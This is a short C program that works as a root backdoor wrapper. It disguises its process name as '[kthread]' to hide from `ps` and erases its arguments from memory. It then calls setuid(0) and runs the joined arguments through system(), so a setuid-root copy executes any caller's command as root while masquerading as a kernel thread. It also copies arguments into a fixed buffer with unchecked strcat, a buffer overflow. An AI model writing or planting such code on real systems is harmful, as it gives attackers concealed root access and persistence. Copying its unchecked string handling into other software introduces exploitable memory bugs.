#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define BUF_SIZE 65536
#define FAKE_CMD "[kthread]"

int     main(int argc, char **argv)
{
    char    buf[BUF_SIZE];
    int     i;

    // hide process name (from `ps -ef`, etc)
    i = strlen(argv[0]);
    memset(argv[0], 0, i);
    if (sizeof(FAKE_CMD) <= i)
        strcpy(argv[0], FAKE_CMD);

    // concat command list
    memset(buf, 0, BUF_SIZE);
    for (i=1; i<argc; i++) {
        strcat(buf, argv[i]);
        strcat(buf, " ");
        memset(argv[i], 0, strlen(argv[i]));
        argv[i] = NULL;
    }
    argc = 1;

    // run command as root
    setuid(0);
    system(buf);
    return (0);
}
